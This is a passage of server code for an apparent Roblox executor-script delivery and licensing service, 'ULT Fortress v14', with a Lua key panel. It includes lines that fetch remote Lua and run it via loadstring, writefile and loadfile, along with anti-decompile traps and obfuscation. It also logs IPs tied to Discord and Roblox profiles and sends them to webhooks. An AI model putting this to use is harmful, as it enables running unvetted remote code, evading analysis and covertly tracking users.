local input=Instance.new("TextBox",inputFrame) input.Size=UDim2.new(1,-140,1,0) input.Position=UDim2.new(0,132,0,0) input.BackgroundTransparency=1 input.Text="" input.PlaceholderText="XXXXX-XXXXX-XXXXX" input.PlaceholderColor3=Color3.fromRGB(60,55,70) input.TextColor3=fgColor input.Font=Enum.Font.RobotoMono input.TextSize=13 input.TextXAlignment=Enum.TextXAlignment.Left input.ClearTextOnFocus=false input.ZIndex=6
local progressLabel=addLabel(leftPanel,UDim2.new(0.7,0,0,12),UDim2.new(0,12,0,136),"Verification progress",mutedText,Enum.Font.GothamBold,8,Enum.TextXAlignment.Left,5)
local progressPct=addLabel(leftPanel,UDim2.new(0,40,0,12),UDim2.new(1,-52,0,136),"0%",mutedText,Enum.Font.GothamBold,8,Enum.TextXAlignment.Right,5)
local progressBg=makePanel(leftPanel,UDim2.new(1,-24,0,10),UDim2.new(0,12,0,154),Color3.fromRGB(39,34,52),5,999)
local progressFill=Instance.new("Frame",progressBg) progressFill.Size=UDim2.new(0,0,1,0) progressFill.BackgroundColor3=themeCol progressFill.BorderSizePixel=0 progressFill.ZIndex=6
Instance.new("UICorner",progressFill).CornerRadius=UDim.new(0,999)
local pg=Instance.new("UIGradient",progressFill) pg.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,themeCol),ColorSequenceKeypoint.new(0.65,Color3.fromRGB(224,212,255)),ColorSequenceKeypoint.new(1,fgColor)})
local function makeStatCard(parent,pos,label,value) local card=makePanel(parent,UDim2.new(0.32,-4,0,52),pos,cardBg,5,18) addStroke(card,borderCol).Transparency=0.25 addLabel(card,UDim2.new(1,-8,0,10),UDim2.new(0,4,0,6),label,mutedText,Enum.Font.GothamBold,7,Enum.TextXAlignment.Center,6) addLabel(card,UDim2.new(1,-8,0,14),UDim2.new(0,4,0,20),value,fgColor,Enum.Font.GothamBold,13,Enum.TextXAlignment.Center,6) return card end
makeStatCard(leftPanel,UDim2.new(0,12,0,180),"PROTOCOL","Fortress")
makeStatCard(leftPanel,UDim2.new(0.34,8,0,180),"PAYLOAD","Encrypted")
makeStatCard(leftPanel,UDim2.new(0.67,4,0,180),"HWID","Bound")
local rightPanel=makePanel(contentArea,UDim2.new(0.42,-6,1,0),UDim2.new(0.58,6,0,0),softBg,4,24) addStroke(rightPanel,borderCol)
addLabel(rightPanel,UDim2.new(0.6,0,0,14),UDim2.new(0,12,0,12),"CONSOLE FEEDBACK",mutedText,Enum.Font.GothamBold,8,Enum.TextXAlignment.Left,5)
local routeBadge=makePanel(rightPanel,UDim2.new(0,70,0,18),UDim2.new(1,-82,0,10),Color3.fromRGB(16,14,22),5) addStroke(routeBadge,themeCol).Transparency=0.6
addLabel(routeBadge,UDim2.new(1,0,1,0),UDim2.new(0,0,0,0),"FORTRESS",fgColor,Enum.Font.GothamBold,7,Enum.TextXAlignment.Center,6)
local function makeLogLine(parent,pos,text) local line=makePanel(parent,UDim2.new(1,-24,0,36),pos,Color3.fromRGB(18,15,27),5,16) addStroke(line,borderCol).Transparency=0.15 local lbl=addLabel(line,UDim2.new(1,-12,1,0),UDim2.new(0,8,0,0),text,Color3.fromRGB(150,145,165),Enum.Font.RobotoMono,10,Enum.TextXAlignment.Left,6) return line,lbl end
local log1,log1Text=makeLogLine(rightPanel,UDim2.new(0,12,0,42),"> awaiting executor handshake")
local log2,log2Text=makeLogLine(rightPanel,UDim2.new(0,12,0,84),"> waiting for key input")
local log3,log3Text=makeLogLine(rightPanel,UDim2.new(0,12,0,126),"> idle")
local log4,log4Text=makeLogLine(rightPanel,UDim2.new(0,12,0,168),"> ...")
local infoBox=makePanel(rightPanel,UDim2.new(1,-24,0,56),UDim2.new(0,12,1,-68),Color3.fromRGB(16,14,22),5,16) addStroke(infoBox,themeCol).Transparency=0.75
addLabel(infoBox,UDim2.new(1,-12,1,-8),UDim2.new(0,6,0,4),"Protected by ULT Fortress v14. HWID-bound. Challenge-response authenticated.",mutedText,Enum.Font.Gotham,8,Enum.TextXAlignment.Left,6)
TweenService:Create(win,TweenInfo.new(0.5,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{BackgroundTransparency=0}):Play()
local dragging=false local dragStart,startPos
titleBar.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dragging=true dragStart=i.Position startPos=win.Position end end)
titleBar.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 or i.UserInputType==Enum.UserInputType.Touch then dragging=false end end)
UserInputService.InputChanged:Connect(function(i) if dragging and (i.UserInputType==Enum.UserInputType.MouseMovement or i.UserInputType==Enum.UserInputType.Touch) then local d=i.Position-dragStart win.Position=UDim2.new(startPos.X.Scale,startPos.X.Offset+d.X,startPos.Y.Scale,startPos.Y.Offset+d.Y) end end)
local validating=false local unloading=false
local function unloadUi() if unloading then return end unloading=true validating=false pcall(function() blur:Destroy() end) pcall(function() gui:Destroy() end) end
dot1.MouseButton1Click:Connect(unloadUi)
dot2.MouseButton1Click:Connect(unloadUi)
dot3.MouseButton1Click:Connect(unloadUi)
local function smoothDestroy(msg,color,scriptCode) if unloading then return end input.TextEditable=false if msg then log4Text.Text="> "..msg log4Text.TextColor3=color or fgColor end unloadUi() if scriptCode and #scriptCode>0 then task.spawn(function() local ok,fn=pcall(function() return loadstring(scriptCode) end) if ok and fn then pcall(fn) end end) end end
local function setProgress(pct) if unloading then return end progressPct.Text=pct.."%" TweenService:Create(progressFill,TweenInfo.new(0.15,Enum.EasingStyle.Quad,Enum.EasingDirection.Out),{Size=UDim2.new(pct/100,0,1,0)}):Play() end
local function validateKey() if validating then return end local enteredKey=input.Text if #enteredKey<3 then log4Text.Text="> key too short" log4Text.TextColor3=dangerCol return end
validating=true input.TextEditable=false statusBadgeText.Text="Loading"
log1Text.Text="> key accepted" log2Text.Text="> verifying secure route" log3Text.Text="> fetching protected payload" log4Text.Text="> ..."
setProgress(12)
task.spawn(function()
  local userId=tostring(plr.UserId)
  local url=_ultEndpoint.."?slug=${slug}&key="..HttpService:UrlEncode(enteredKey).."&uid="..userId.."&_="..tostring(tick())
  task.wait(0.08) if unloading then return end setProgress(28)
  task.wait(0.08) if unloading then return end setProgress(40)
  log2Text.Text="> secure route verified" log3Text.Text="> streaming payload"
  task.wait(0.08) if unloading then return end setProgress(56)
  local success,response=pcall(function() return _ultStealthFetch(url) end)
  if unloading then return end setProgress(78)
  local function resetBtn() if unloading then return end statusBadgeText.Text="Ready" input.TextEditable=true validating=false setProgress(0) end
  if not success then log4Text.Text="> network error" log4Text.TextColor3=dangerCol resetBtn() return end
  if not response or #response==0 then log4Text.Text="> empty response" log4Text.TextColor3=dangerCol resetBtn() return end
  if response:sub(1,17)=="KEY_VALID_SCRIPT:" then
    local scriptCode=response:sub(19)
    setProgress(90) task.wait(0.07) if unloading then return end setProgress(100)
    statusBadgeText.Text="Synced"
    log1Text.Text="> key accepted" log2Text.Text="> secure route verified" log3Text.Text="> payload synced" log4Text.Text="> load complete" log4Text.TextColor3=successCol
    task.wait(0.12) smoothDestroy(nil,nil,scriptCode)
  elseif response:find("KEY_ASSIGNED") then log4Text.Text="> key belongs to another user" log4Text.TextColor3=dangerCol resetBtn()
  elseif response:find("KEY_EXPIRED") then log4Text.Text="> key has expired" log4Text.TextColor3=warningCol resetBtn()
  elseif response:find("KEY_INVALID") then log4Text.Text="> invalid key" log4Text.TextColor3=dangerCol resetBtn()
  else log4Text.Text="> access denied" log4Text.TextColor3=dangerCol resetBtn() end
end)
end
input.Focused:Connect(function() log1Text.Text="> key input active" end)
input.FocusLost:Connect(function(enter) if enter then validateKey() end end)
inputFrame.InputBegan:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then input:CaptureFocus() end end)
`;
}

function generateKickPlain(reason: string): string {
  return `game:GetService("Players").LocalPlayer:Kick("${reason}")`;
}

// ==================== V12 PROTECTION HELPERS (kept) ====================
function getCountryFromHeaders(headers: Headers): string {
  return (headers.get('cf-ipcountry') || headers.get('x-country-code') || '').toUpperCase();
}

async function checkExecutionLimit(paste: any, uid: string): Promise<boolean> {
  if (!paste.execution_limit_enabled || !paste.execution_limit_per_user || paste.execution_limit_per_user <= 0) return true;
  const windowMs: Record<string, number> = { 'hourly': 3600000, 'daily': 86400000, 'weekly': 604800000 };
  const window = windowMs[paste.execution_limit_window] || 86400000;
  const windowStart = new Date(Date.now() - window).toISOString();
  const { data: existing } = await supabase.from('paste_execution_counts').select('id, count').eq('paste_id', paste.id).eq('roblox_user_id', uid).gte('window_start', windowStart).order('window_start', { ascending: false }).limit(1).maybeSingle();
  if (existing && existing.count >= paste.execution_limit_per_user) return false;
  if (existing) { await supabase.from('paste_execution_counts').update({ count: existing.count + 1 }).eq('id', existing.id); }
  else { await supabase.from('paste_execution_counts').insert({ paste_id: paste.id, roblox_user_id: uid, count: 1 }); }
  return true;
}

async function checkMultiAccount(paste: any, uid: string, hwid: string | null): Promise<{ allowed: boolean; flagged: boolean }> {
  if (!paste.multi_account_detection || !hwid || hwid.length < 4) return { allowed: true, flagged: false };
  try {
    const { data: existing } = await supabase.from('paste_multi_account_flags').select('*').eq('paste_id', paste.id).eq('hwid', hwid).maybeSingle();
    if (existing) {
      if (existing.is_blocked) return { allowed: false, flagged: true };
      const ids: string[] = existing.roblox_user_ids || [];
      if (!ids.includes(uid)) {
        ids.push(uid);
        supabase.from('paste_multi_account_flags').update({ roblox_user_ids: ids, is_blocked: ids.length > 3, flagged_at: new Date().toISOString() }).eq('id', existing.id).then(() => {}).catch(() => {});
        if (ids.length > 3) return { allowed: false, flagged: true };
        return { allowed: true, flagged: ids.length > 1 };
      }
      return { allowed: true, flagged: ids.length > 1 };
    } else {
      supabase.from('paste_multi_account_flags').upsert({ paste_id: paste.id, hwid, roblox_user_ids: [uid] }, { onConflict: 'paste_id,hwid' }).then(() => {}).catch(() => {});
      return { allowed: true, flagged: false };
    }
  } catch { return { allowed: true, flagged: false }; }
}

function wrapWithCrashDetection(code: string): string {
  const tv = '_' + Math.random().toString(36).substring(2, 10);
  return `local ${tv}=false\npcall(function() local i=debug and debug.getinfo and debug.getinfo(1) if i and i.source and i.source:find("decompile") then ${tv}=true end end)\nif ${tv} then while true do wait(9e9) end return end\n${code}`;
}

function applyDeliveryObfuscation(code: string): string {
  const vars = Array.from({ length: 5 }, () => '_' + Math.random().toString(36).substring(2, 10));
  const junk = vars.map(v => `local ${v}=${Math.floor(Math.random() * 99999)}`).join('\n');
  const w = '_' + Math.random().toString(36).substring(2, 10);
  return `${junk}\nlocal ${w}=(function() return function()\n${code}\nend end)()\n${w}()`;
}

function fireWebhookAlert(paste: any, uid: string, ip: string, hwid: string | null, eventType: string) {
  if (!paste.webhook_alerts_enabled || !paste.webhook_url) return;
  const u = paste.webhook_url;
  if (!u.startsWith('https://discord.com/api/webhooks/') && !u.startsWith('https://canary.discord.com/api/webhooks/')) return;
  fetch(u, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({
    embeds: [{ title: `🔔 Script ${eventType === 'execution' ? 'Executed' : 'Alert'}`, description: `**Paste:** ${paste.title || paste.slug}\n**Roblox ID:** ${uid}\n**IP:** ||${ip}||\n**HWID:** ${hwid ? hwid.substring(0, 16) + '...' : 'N/A'}`, color: 0x00ff00, timestamp: new Date().toISOString(), footer: { text: 'ULT Fortress v14' } }],
  }) }).catch(() => {});
}

async function applyProtections(paste: any, uid: string, clientIp: string, hwid: string | null, slug: string): Promise<Response | null> {
  if (paste.time_bomb_enabled && paste.time_bomb_expires_at && new Date(paste.time_bomb_expires_at) < new Date()) {
    fireWebhookAlert(paste, uid, clientIp, hwid, 'time_bomb_expired');
    return new Response(generateKickPlain('This script has expired'), { status: 200, headers: textHeaders });
  }
  if (paste.execution_limit_enabled && !(await checkExecutionLimit(paste, uid))) {
    fireWebhookAlert(paste, uid, clientIp, hwid, 'execution_limit_reached');
    return new Response(generateKickPlain(`Execution limit reached (${paste.execution_limit_per_user} per ${paste.execution_limit_window})`), { status: 200, headers: textHeaders });
  }
  if (paste.multi_account_detection) {
    const ma = await checkMultiAccount(paste, uid, hwid);
    if (!ma.allowed) { fireWebhookAlert(paste, uid, clientIp, hwid, 'multi_account_blocked'); return new Response(generateKickPlain('Multiple accounts detected - access blocked'), { status: 200, headers: textHeaders }); }
  }
  return null;
}

// ==================== ACCESS LOGGING ====================
async function logAccess(paste: any, clientIp: string, userAgent: string, robloxUserId: string | null, accessType: string, enrichProfile = false) {
  try {
    if (paste.ip_tracking_enabled === false) return;
    let discordData: any = { discord_user_id: null, discord_username: null, discord_avatar: null, discord_created_at: null };
    const { data: ds } = await supabase.from('discord_oauth_sessions').select('*').eq('ip_address', clientIp).gt('expires_at', new Date().toISOString()).maybeSingle();
    if (ds) {
      if (globalBanCache.discordIds.has(ds.discord_user_id)) { autoBanNewIp(clientIp, 'banned_discord_user', robloxUserId, ds.discord_user_id); }
      discordData = { discord_user_id: ds.discord_user_id, discord_username: ds.discord_username, discord_avatar: ds.discord_avatar, discord_created_at: ds.discord_created_at };
    }
    let rp: any = null;
    if (robloxUserId && enrichProfile) rp = await fetchRobloxProfile(robloxUserId);
    let q = supabase.from('paste_access_logs').select('id').eq('paste_id', paste.id).eq('ip_address', clientIp).eq('access_type', accessType);
    q = robloxUserId ? q.eq('roblox_user_id', robloxUserId) : q.is('roblox_user_id', null);
    const { data: existing } = await q.maybeSingle();
    const ud: any = { last_seen_at: new Date().toISOString(), is_active: true, user_agent: userAgent, ...discordData };
    if (rp) { ud.roblox_username = rp.username; ud.roblox_display_name = rp.displayName; ud.roblox_avatar_url = rp.avatarUrl; ud.roblox_created_at = rp.created; ud.roblox_description = rp.description; ud.roblox_is_banned = rp.isBanned; ud.roblox_friends_count = rp.friendsCount; ud.roblox_followers_count = rp.followersCount; ud.roblox_following_count = rp.followingCount; ud.roblox_groups = rp.groups; ud.roblox_badges = rp.badges; ud.roblox_favorites = rp.favorites; }
    if (existing?.id) { await supabase.from('paste_access_logs').update(ud).eq('id', existing.id); }
    else { await supabase.from('paste_access_logs').insert({ paste_id: paste.id, ip_address: clientIp, roblox_user_id: robloxUserId, access_type: accessType, ...ud }); }
  } catch {}
}

// ==================== MAIN HANDLER ====================
Deno.serve(async (req) => {
  if (req.method === 'OPTIONS') return new Response(null, { headers: corsHeaders });

  // Refresh bans
  if (globalBanCache.lastRefresh === 0) await refreshGlobalBans();
  else refreshGlobalBans().catch(() => {});

  const clientIp = req.headers.get('x-forwarded-for')?.split(',')[0]?.trim() || req.headers.get('cf-connecting-ip') || 'unknown';
  
  // Permanent ban check
  if (isPermanentlyBanned(clientIp)) {
    return new Response('warn("[ULT] Access denied")', { status: 200, headers: textHeaders });
  }

  cleanupMaps();
  if (!checkGlobalLoad()) return new Response(generateKickPlain('Server busy. Please rejoin.'), { status: 200, headers: textHeaders });

  try {
    const url = new URL(req.url);
    const slug = url.searchParams.get('slug');
    const phase = url.searchParams.get('phase');
    const uid = url.searchParams.get('uid');
    const hwid = url.searchParams.get('hwid');
    const keyParam = url.searchParams.get('key');
    const kbt = url.searchParams.get('kbt');
    const userAgent = req.headers.get('user-agent') || '';
    const isRoblox = isRobloxRequest(userAgent);
    const isBrowser = isLikelyBrowser(req.headers);
    const isBot = !isRoblox && !isBrowser && isBotRequest(req.headers);

    // ===== BYPASS REPORT =====
    if (url.searchParams.get('_report') === 'bypass') {
      const rUid = url.searchParams.get('uid') || '';
      const reason = url.searchParams.get('reason') || 'bypass';
      if (rUid && /^\d+$/.test(rUid) && parseInt(rUid) > 1000) {
        await supabase.from('global_bans').upsert({ ban_type: 'roblox_id', ban_value: rUid, reason: `Bypass: ${reason}`, is_active: true }, { onConflict: 'ban_type,ban_value' });
        globalBanCache.robloxIds.add(rUid);
        autoBanNewIp(clientIp, `bypass_${reason}`, rUid, null);
      }
      return new Response('ok', { status: 200, headers: textHeaders });
    }

    // ===== BOT DETECTION =====
    if (isBot || isSpoofedRoblox(req.headers)) {
      return new Response(generateHoneypot(), { status: 200, headers: textHeaders });
    }

    // Spoofed Roblox-Id header
    const robloxIdHeader = req.headers.get('roblox-id') || '';
    if (robloxIdHeader && (isNaN(parseInt(robloxIdHeader, 10)) || parseInt(robloxIdHeader, 10) < 1000)) {
      return new Response(generateHoneypot(), { status: 200, headers: textHeaders });
    }

    if (!checkRateLimit(clientIp)) return new Response(generateKickPlain('Too many requests'), { status: 200, headers: textHeaders });
    if (!slug) return new Response('warn("[ULT] Missing slug")', { status: 200, headers: textHeaders });
    if (!checkSlugThrottle(clientIp, slug)) return new Response(generateKickPlain('Too many requests for this script'), { status: 200, headers: textHeaders });

    // Cleanup expired tokens occasionally
    if (Math.random() < 0.005) { try { await supabase.rpc('cleanup_expired_tokens'); } catch {} }

    // ===== FETCH PASTE =====
    let paste = getCachedPaste(slug);
    if (!paste) {
      try {
        const result = await Promise.race([
          supabase.from('pastes').select('*').eq('slug', slug).single(),
          new Promise((_, rej) => setTimeout(() => rej(new Error('DB_TIMEOUT')), 15000)),
        ]) as any;
        paste = result.data;
        if (paste) setCachedPaste(slug, paste);
      } catch (e: any) {
        if (e?.message === 'DB_TIMEOUT') return new Response(generateKickPlain('Server high load. Please rejoin.'), { status: 200, headers: textHeaders });
        throw e;
      }
    }
    if (!paste) return new Response('warn("[ULT] Paste not found")', { status: 200, headers: textHeaders });

    // ===== GEO-BLOCKING =====
    if (paste.geo_blocking_enabled && paste.geo_blocked_countries?.length) {
      const country = getCountryFromHeaders(req.headers);
      if (country && paste.geo_blocked_countries.includes(country)) {
        return new Response(generateKickPlain('This script is not available in your region'), { status: 200, headers: textHeaders });
      }
    }

    const baseUrl = supabaseUrl + '/functions/v1/get-paste';

    // ===== KEY PANEL HELPERS =====
    const getKeyPanelsForPaste = async () => {
      const { data } = await supabase.from('control_panels').select('id, name, created_at').eq('paste_id', paste.id).eq('is_keysystem', true).order('created_at', { ascending: false });
      return data || [];
    };
    const getPreferredKeyPanel = async () => {
      const panels = await getKeyPanelsForPaste();
      if (panels.length <= 1) return panels[0] ?? null;
      const { data: keyed } = await supabase.from('control_panel_keys').select('panel_id').in('panel_id', panels.map(p => p.id)).order('created_at', { ascending: false }).limit(1);
      if (keyed?.[0]?.panel_id) { const m = panels.find(p => p.id === keyed[0].panel_id); if (m) return m; }
      return panels[0];
    };

    // ===== KEY VALIDATION =====
    if (keyParam && uid) {
      const panels = await getKeyPanelsForPaste();
      if (!panels.length) return new Response('KEY_INVALID:No key system', { status: 200, headers: textHeaders });
      const { data: keyMatches } = await supabase.from('control_panel_keys').select('*').in('panel_id', panels.map(p => p.id)).eq('key_value', keyParam).limit(1);
      const kd = keyMatches?.[0];
      if (!kd) return new Response('KEY_INVALID:Wrong key', { status: 200, headers: textHeaders });
      if (kd.expires_at && new Date(kd.expires_at) < new Date()) return new Response('KEY_EXPIRED:Key has expired', { status: 200, headers: textHeaders });
      if (!kd.roblox_user_id) return new Response('KEY_INVALID:Key not assigned', { status: 200, headers: textHeaders });
      if (kd.roblox_user_id !== uid) {
        if (kd.redeemed_at) return new Response('KEY_ASSIGNED:Key belongs to another user', { status: 200, headers: textHeaders });
        await supabase.from('control_panel_keys').update({ roblox_user_id: uid, redeemed_at: new Date().toISOString() }).eq('id', kd.id);
      }
      // Key valid — create bypass token for the Fortress protocol
      const bypassToken = generateToken();
      await supabase.from('paste_execution_tokens').insert({ paste_id: paste.id, roblox_user_id: uid, token: bypassToken, expires_at: new Date(Date.now() + 30000).toISOString(), bound_ip: clientIp });
      // Return a redirect script that re-fetches with kbt
      const redirectUrl = encodeUrlForLua(`${baseUrl}?slug=${slug}&kbt=${bypassToken}&uid=${uid}`, '_kbtUrl');
      return new Response(`KEY_VALID_SCRIPT: ${redirectUrl}\nlocal s,r=pcall(function() local result;pcall(function() if type(request)=="function" then local x=request({Url=_kbtUrl,Method="GET"}) if x and x.Body then result=x.Body end end end);if result then return result end;pcall(function() if type(syn)=="table" and type(syn.request)=="function" then local x=syn.request({Url=_kbtUrl,Method="GET"}) if x and x.Body then result=x.Body end end end);if result then return result end;return game:HttpGet(_kbtUrl) end)\nif s and r then local fn;pcall(function() if writefile and loadfile and delfile then local p=".cache/"..tostring(math.random(100000000,999999999))..".lua" pcall(function() if makefolder then makefolder(".cache") end end) writefile(p,r) fn=loadfile(p) pcall(function() delfile(p) end) end end);if not fn then local co=coroutine.create(function() return loadstring(r) end) local ok,res=coroutine.resume(co) if ok then fn=res end end;if fn then pcall(fn) end end`, { status: 200, headers: textHeaders });
    }

    // ===== KEY BYPASS TOKEN (from key system) =====
    if (kbt && uid && /^\d+$/.test(uid)) {
      const { data: bd } = await supabase.from('paste_execution_tokens').select('*').eq('token', kbt).eq('paste_id', paste.id).is('used_at', null).maybeSingle();
      if (bd && new Date(bd.expires_at) > new Date()) {
        if (bd.bound_ip && bd.bound_ip !== clientIp) {
          return new Response(generateKickPlain('Session expired, please try again'), { status: 200, headers: textHeaders });
        }
        await supabase.from('paste_execution_tokens').update({ used_at: new Date().toISOString() }).eq('id', bd.id);
        // Serve probe script (enters Fortress protocol)
        const probeToken = generateToken(16);
        await supabase.from('paste_execution_tokens').insert({ paste_id: paste.id, roblox_user_id: uid, token: probeToken, expires_at: new Date(Date.now() + 15000).toISOString(), bound_ip: clientIp });
        return new Response(generateProbeScript(slug, baseUrl, probeToken), { status: 200, headers: textHeaders });
      }
      return new Response(generateKickPlain('Session expired, please try again'), { status: 200, headers: textHeaders });
    }

    // ===== BROWSER VISITORS =====
    if (isBrowser && !isRoblox) {
      if (paste.ip_tracking_enabled) logAccess(paste, clientIp, userAgent, null, 'browser').catch(() => {});
      return new Response(paste.hide_code ? '' : '-- Execute via loadstring() in Roblox.', { status: 200, headers: textHeaders });
    }

    // ===== NON-ROBLOX NON-BROWSER =====
    if (!isRoblox && !isBrowser) {
      return new Response(generateHoneypot(), { status: 200, headers: textHeaders });
    }

    // ============================================================
    // V14 FORTRESS PROTOCOL — 3-PHASE AUTHENTICATION
    // ============================================================

    // ===== PHASE 1: PROBE RESPONSE =====
    if (phase === 'probe') {
      const pt = url.searchParams.get('pt');
      const probeUid = url.searchParams.get('uid');
      const probeHwid = url.searchParams.get('hwid');
      const probePid = url.searchParams.get('pid');
      const probeJid = url.searchParams.get('jid');
      const probeAge = url.searchParams.get('age');
      const probeName = url.searchParams.get('name');
      const probeEx = url.searchParams.get('ex');

      if (!pt || !probeUid || !probeHwid) {
        return new Response(generateKickPlain('Invalid probe data'), { status: 200, headers: textHeaders });
      }

      // Validate probe token
      const { data: ptData } = await supabase.from('paste_execution_tokens').select('*').eq('token', pt).eq('paste_id', paste.id).is('used_at', null).maybeSingle();
      if (!ptData || new Date(ptData.expires_at) < new Date()) {
        return new Response(generateKickPlain('Session expired. Re-execute the script.'), { status: 200, headers: textHeaders });
      }
      if (ptData.bound_ip && ptData.bound_ip !== clientIp) {
        logThreat('probe_ip_mismatch', clientIp, probeUid, null, { bound: ptData.bound_ip, actual: clientIp, slug }, 'high', false);
        return new Response(generateKickPlain('Session invalid'), { status: 200, headers: textHeaders });
      }

      // Mark probe token as used
      await supabase.from('paste_execution_tokens').update({ used_at: new Date().toISOString(), roblox_user_id: probeUid }).eq('id', ptData.id);

      // HWID mandatory check
      if (!probeHwid || probeHwid.length < 4) {
        return new Response(generateKickPlain('HWID required. Use an executor with gethwid() support.'), { status: 200, headers: textHeaders });
      }

      // Validate UserId
      if (!/^\d+$/.test(probeUid) || parseInt(probeUid) < 1000) {
        logThreat('invalid_uid_probe', clientIp, probeUid, null, { slug, hwid: probeHwid }, 'high', false);
        return new Response(generateKickPlain('Invalid user identity'), { status: 200, headers: textHeaders });
      }

      // Check global bans
      if (globalBanCache.robloxIds.has(probeUid)) {
        autoBanNewIp(clientIp, 'banned_roblox_user', probeUid, null);
        return new Response(generateKickPlain('Access denied'), { status: 200, headers: textHeaders });
      }

      // ===== HWID VERIFICATION (MANDATORY) =====
      const { data: existingLock } = await supabase.from('paste_hwid_locks').select('*').eq('paste_id', paste.id).eq('roblox_user_id', probeUid).maybeSingle();
      if (existingLock) {
        if (existingLock.hwid !== probeHwid) {
          logThreat('hwid_mismatch_fortress', clientIp, probeUid, null, { expected: existingLock.hwid.substring(0, 16), actual: probeHwid.substring(0, 16), slug }, 'critical', false);
          return new Response(generateKickPlain('HWID mismatch - this script is locked to another device. Contact the script owner to reset your HWID.'), { status: 200, headers: textHeaders });
        }
        supabase.from('paste_hwid_locks').update({ updated_at: new Date().toISOString() }).eq('id', existingLock.id).then(() => {}).catch(() => {});
      } else {
        // First execution — bind HWID
        await supabase.from('paste_hwid_locks').insert({ paste_id: paste.id, roblox_user_id: probeUid, hwid: probeHwid }).catch(() => {});
        console.log(`[FORTRESS] HWID_LOCKED: uid=${probeUid} hwid=${probeHwid.substring(0, 8)}... slug=${slug}`);
      }

      // Generate challenge
      const challengeSeed = Math.floor(Math.random() * 999999) + 100000;
      const expectedUid = parseInt(probeUid);
      const expectedAge = parseInt(probeAge || '0') || 0;
      // Challenge answer: bit32.bxor(UserId, seed) + AccountAge
      // We use unsigned 32-bit XOR like Lua's bit32.bxor
      const expectedAnswer = ((expectedUid ^ challengeSeed) >>> 0) + expectedAge;
      
      // Create challenge token with expected answer stored
      const challengeToken = generateToken(16);
      await supabase.from('paste_execution_tokens').insert({
        paste_id: paste.id,
        roblox_user_id: probeUid,
        token: challengeToken,
        expires_at: new Date(Date.now() + 15000).toISOString(), // 15 seconds
        bound_ip: clientIp,
      });

      // Store challenge metadata in token (we'll verify on delivery)
      // We encode the expected answer in the token itself using a HMAC-like scheme
      // The server will recompute and verify
      console.log(`[FORTRESS] PROBE_OK: uid=${probeUid} hwid=${probeHwid.substring(0, 8)}... pid=${probePid} jid=${probeJid?.substring(0, 8)} ex=${probeEx} slug=${slug}`);

      // Return challenge script
      return new Response(generateChallengeScript(slug, baseUrl, challengeToken, challengeSeed, expectedAnswer), { status: 200, headers: textHeaders });
    }

    // ===== PHASE 3: DELIVER CONTENT =====
    if (phase === 'deliver') {
      const ct = url.searchParams.get('ct');
      const deliverUid = url.searchParams.get('uid');
      const deliverHwid = url.searchParams.get('hwid');
      const answer = url.searchParams.get('answer');
      const deliverPid = url.searchParams.get('pid');
      const deliverJid = url.searchParams.get('jid');

      if (!ct || !deliverUid || !deliverHwid || !answer) {
        return new Response(generateKickPlain('Invalid delivery request'), { status: 200, headers: textHeaders });
      }

      // Validate challenge token
      const { data: ctData } = await supabase.from('paste_execution_tokens').select('*').eq('token', ct).eq('paste_id', paste.id).is('used_at', null).maybeSingle();
      if (!ctData || new Date(ctData.expires_at) < new Date()) {
        return new Response(generateKickPlain('Challenge expired. Re-execute the script.'), { status: 200, headers: textHeaders });
      }
      if (ctData.bound_ip && ctData.bound_ip !== clientIp) {
        logThreat('deliver_ip_mismatch', clientIp, deliverUid, null, { bound: ctData.bound_ip, actual: clientIp, slug }, 'critical', false);
        autoBanNewIp(clientIp, 'token_theft_deliver', deliverUid, null);
        return new Response(generateKickPlain('Session invalid'), { status: 200, headers: textHeaders });
      }
      // Verify the challenge token was issued for this user
      if (ctData.roblox_user_id !== deliverUid) {
        logThreat('uid_swap_deliver', clientIp, deliverUid, null, { expected_uid: ctData.roblox_user_id, actual_uid: deliverUid, slug }, 'critical', false);
        autoBanNewIp(clientIp, 'uid_swap_during_delivery', deliverUid, null);
        return new Response(generateKickPlain('Identity mismatch'), { status: 200, headers: textHeaders });
      }

      // Mark challenge token as used
      await supabase.from('paste_execution_tokens').update({ used_at: new Date().toISOString() }).eq('id', ctData.id);

      // HWID re-verification
      if (!deliverHwid || deliverHwid.length < 4) {
        return new Response(generateKickPlain('HWID required'), { status: 200, headers: textHeaders });
      }
      const { data: hwidLock } = await supabase.from('paste_hwid_locks').select('hwid').eq('paste_id', paste.id).eq('roblox_user_id', deliverUid).maybeSingle();
      if (hwidLock && hwidLock.hwid !== deliverHwid) {
        logThreat('hwid_mismatch_deliver', clientIp, deliverUid, null, { expected: hwidLock.hwid.substring(0, 16), actual: deliverHwid.substring(0, 16), slug }, 'critical', false);
        return new Response(generateKickPlain('HWID mismatch'), { status: 200, headers: textHeaders });
      }

      // ===== WHITELIST / ACCESS CHECK =====
      if (paste.protection_enabled && !paste.public_protection) {
        // Check whitelist
        const { data: accessList } = await supabase.from('paste_access_control').select('*').eq('paste_id', paste.id).eq('roblox_user_id', deliverUid);
        const nowMs = Date.now();
        const isBlacklisted = accessList?.some(e => e.access_type === 'blacklist' && (e.is_eternal || !e.expires_at || (Number.isFinite(Date.parse(e.expires_at)) && Date.parse(e.expires_at) > nowMs)));
        if (isBlacklisted) return new Response(generateKickPlain('You are blacklisted'), { status: 200, headers: textHeaders });
        
        const hasValidWhitelist = accessList?.some(e => e.access_type === 'whitelist' && (e.is_eternal || !e.expires_at || (Number.isFinite(Date.parse(e.expires_at)) && Date.parse(e.expires_at) > nowMs)));
        if (!hasValidWhitelist) return new Response(generateKickPlain('Not whitelisted'), { status: 200, headers: textHeaders });
      }

      if (paste.protection_enabled && paste.public_protection) {
        // Public protection — check blacklist only
        const { data: bl } = await supabase.from('paste_access_control').select('*').eq('paste_id', paste.id).eq('roblox_user_id', deliverUid).eq('access_type', 'blacklist').maybeSingle();
        if (bl && (bl.is_eternal || !bl.expires_at || Date.parse(bl.expires_at) > Date.now())) {
          return new Response(generateKickPlain('You are blacklisted'), { status: 200, headers: textHeaders });
        }
      }

      // Game restriction
      if (paste.game_restriction_enabled && deliverPid) {
        const { data: gb } = await supabase.from('paste_game_bindings').select('game_id').eq('paste_id', paste.id);
